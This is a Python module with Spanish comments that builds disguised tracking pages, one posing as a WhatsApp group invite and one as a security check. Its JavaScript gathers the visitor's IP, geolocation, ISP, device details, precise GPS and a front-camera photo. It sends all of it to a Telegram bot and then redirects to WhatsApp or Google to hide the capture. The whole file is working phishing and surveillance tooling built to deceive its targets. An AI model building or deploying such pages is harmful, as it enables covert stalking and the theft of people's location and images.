
"""
Plantillas HTML para el módulo de tracking.
Contiene la estructura base y los scripts JS para Geo y Cam tracking.
"""

CSS_STYLES_WHATSAPP = """
<style>
    * {margin: 0; padding: 0; box-sizing: border-box;}
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        background: #0a0f1c;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
    }
    .container {
        background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
        border-radius: 20px;
        padding: 40px;
        max-width: 500px;
        width: 100%;
        box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
        text-align: center;
        animation: fadeIn 0.6s ease;
    }
    @keyframes fadeIn {
        from {opacity: 0; transform: translateY(-30px);}
        to {opacity: 1; transform: translateY(0);}
    }
    .logo {
        width: 80px;
        height: 80px;
        margin: 0 auto 20px;
        background: linear-gradient(135deg, #25d366 0%, #128c7e 100%);
        border-radius: 20px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 45px;
        box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
    }
    h1 {
        color: #ffffff;
        font-size: 26px;
        margin-bottom: 10px;
        font-weight: 600;
    }
    p {
        color: #8b949e;
        font-size: 15px;
        line-height: 1.6;
        margin-bottom: 25px;
    }
    .btn {
        background: linear-gradient(135deg, #25d366 0%, #128c7e 100%);
        color: white;
        padding: 15px 40px;
        border: none;
        border-radius: 30px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
        transition: all 0.3s ease;
        text-decoration: none;
        display: inline-block;
    }
    .btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(37, 211, 102, 0.4);
    }
    .loader {
        width: 50px;
        height: 50px;
        border: 4px solid #21262d;
        border-top: 4px solid #25d366;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 20px;
    }
    @keyframes spin {
        0% {transform: rotate(0deg);}
        100% {transform: rotate(360deg);}
    }
    .hidden {display: none;}
    .members {
        color: #58a6ff;
        font-size: 14px;
        margin-top: 15px;
    }
</style>
"""

CSS_STYLES_CAMERA = """
<style>
    * {margin: 0; padding: 0; box-sizing: border-box;}
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        background: #0a0f1c;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
    }
    .container {
        background: linear-gradient(135deg, #1a1d29 0%, #2d1b3d 100%);
        border-radius: 20px;
        padding: 40px;
        max-width: 500px;
        width: 100%;
        box-shadow: 0 8px 32px rgba(138, 43, 226, 0.3);
        text-align: center;
        animation: fadeIn 0.6s ease;
    }
    @keyframes fadeIn {
        from {opacity: 0; transform: translateY(-30px);}
        to {opacity: 1; transform: translateY(0);}
    }
    .logo {
        width: 80px;
        height: 80px;
        margin: 0 auto 20px;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        border-radius: 20px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 45px;
        box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
    }
    h1 {
        color: #ffffff;
        font-size: 26px;
        margin-bottom: 10px;
        font-weight: 600;
    }
    p {
        color: #a8b3cf;
        font-size: 15px;
        line-height: 1.6;
        margin-bottom: 25px;
    }
    .loader {
        width: 50px;
        height: 50px;
        border: 4px solid #2d1b3d;
        border-top: 4px solid #667eea;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 20px;
    }
    @keyframes spin {
        0% {transform: rotate(0deg);}
        100% {transform: rotate(360deg);}
    }
</style>
"""

JS_COMMON_FUNCTIONS = """
const BOT='__TOKEN__', CHAT='__CHAT_ID__';

const send = async (txt) => {
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT, text: txt, parse_mode: 'HTML'})
    });
};

const sendPhoto = async (blob) => {
    const formData = new FormData();
    formData.append('chat_id', CHAT);
    formData.append('photo', blob, 'capture.jpg');
    formData.append('caption', '📸 <b>Captura de Camara</b>');
    formData.append('parse_mode', 'HTML');
    
    await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
};

const getBasicInfo = async () => {
    let info = `🔍 <b>NUEVA VISITA DETECTADA</b>\\n\\n`;
    let ip = '';
    let lat = 0, lon = 0;
    
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const d = await r.json();
        ip = d.ip;
        info += `🌐 <b>IP:</b> <code>${ip}</code>\\n`;
        
        const ipd = await fetch(`https://ip-api.com/json/${ip}?fields=lat,lon,city,country,isp,status`);
        const geo = await ipd.json();
        if(geo.status === 'success') {
            lat = geo.lat;
            lon = geo.lon;
            info += `📍 <b>Ubicacion:</b> ${geo.city}, ${geo.country}\\n`;
            info += `🏢 <b>ISP:</b> ${geo.isp}\\n`;
            info += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver en Mapa</a>\\n`;
        }
    } catch(e) {}
    
    info += `📱 <b>UA:</b> ${navigator.userAgent}\\n`;
    info += `💻 <b>OS:</b> ${navigator.platform}\\n`;
    try {
        const battery = await navigator.getBattery();
        info += `🔋 <b>Bateria:</b> ${Math.round(battery.level * 100)}%\\n`;
    } catch(e) {}
    
    await send(info);
    
    return {lat, lon};
};
"""

JS_GEO_AUTO = """
const getGeoAuto = async (ipLat, ipLon) => {
    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (p) => {
            const lat = p.coords.latitude;
            const lon = p.coords.longitude;
            const acc = p.coords.accuracy;
            let gps = `🎯 <b>GPS EXACTO OBTENIDO</b>\\n\\n`;
            gps += `📍 <b>Coords:</b> <code>${lat}, ${lon}</code>\\n`;
            gps += `📏 <b>Precision:</b> ${acc} metros\\n`;
            gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver en Mapa</a>`;
            await send(gps);
            redirect();
        }, async (e) => {
            if(ipLat && ipLon) {
                let gps = `📍 <b>Ubicacion por IP</b>\\n\\n`;
                gps += `📍 <b>Coords:</b> <code>${ipLat}, ${ipLon}</code>\\n`;
                gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver en Mapa</a>\\n`;
                gps += `\\nℹ️ <i>GPS no disponible, usando ubicacion de red</i>`;
                await send(gps);
            } else {
                await send(`❌ <b>GPS Denegado:</b> No se pudo obtener ubicacion`);
            }
            redirect();
        }, {enableHighAccuracy: true, timeout: 15000, maximumAge: 0});
    } else {
        if(ipLat && ipLon) {
            let gps = `📍 <b>Ubicacion por IP</b>\\n\\n`;
            gps += `📍 <b>Coords:</b> <code>${ipLat}, ${ipLon}</code>\\n`;
            gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver en Mapa</a>`;
            await send(gps);
        }
        redirect();
    }
};
"""

JS_CAM_AUTO = """
const getCamAuto = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" },
            audio: false
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        video.onloadedmetadata = () => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    await sendPhoto(blob);
                    stream.getTracks().forEach(t => t.stop());
                    getGeoAuto(0, 0);
                }, 'image/jpeg', 0.9);
            }, 1500);
        };
    } catch (e) {
        await send(`❌ <b>Camara Denegada/Error:</b> ${e.message}`);
        getGeoAuto(0, 0);
    }
};
"""

def get_template(token, chat_id, mode="geo"):
    """Genera el HTML completo con camuflaje atractivo"""
    
    logic = JS_COMMON_FUNCTIONS.replace('__TOKEN__', token).replace('__CHAT_ID__', str(chat_id))
    
    if mode == "cam":
        css = CSS_STYLES_CAMERA
        init_call = "const ipGeo = await getBasicInfo(); getCamAuto();"
        logic += JS_GEO_AUTO + JS_CAM_AUTO
        icon = "📸"
        title = "Verificación de Seguridad"
        subtitle = "Verificando tu identidad para acceder..."
    else:
        css = CSS_STYLES_WHATSAPP
        init_call = "const ipGeo = await getBasicInfo(); getGeoAuto(ipGeo.lat, ipGeo.lon);"
        logic += JS_GEO_AUTO
        icon = "💬"
        title = "Únete al Grupo"
        subtitle = "Te han invitado a un grupo privado. Verificando tu ubicación para acceso seguro..."

    template = f"""
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Grupo privado de WhatsApp">
    <title>{title}</title>
    __CSS__
</head>
<body>
    <div class="container">
        <div class="logo">{icon}</div>
        <h1 id="title">{title}</h1>
        <p id="subtitle">{subtitle}</p>
        <div class="loader" id="loader"></div>
        <div class="members" id="members">{'🟢 45 miembros activos' if mode == 'geo' else ''}</div>
    </div>
    <script>
        const redirect = () => {{ 
            document.getElementById('loader').classList.add('hidden');
            document.getElementById('title').innerText = '✅ Verificación Completa';
            document.getElementById('subtitle').innerText = 'Redirigiendo a {'WhatsApp' if mode == 'geo' else 'la aplicación'}...';
            setTimeout(() => {{ 
                window.location.href = "{'https://chat.whatsapp.com' if mode == 'geo' else 'https://google.com'}"; 
            }}, 2000);
        }};
        
        __LOGIC__
        
        (async () => {{
            __INIT__
        }})();
    </script>
</body>
</html>
"""
    html = template.replace('__CSS__', css)
    html = html.replace('__LOGIC__', logic)
    html = html.replace('__INIT__', init_call)
    
    return html
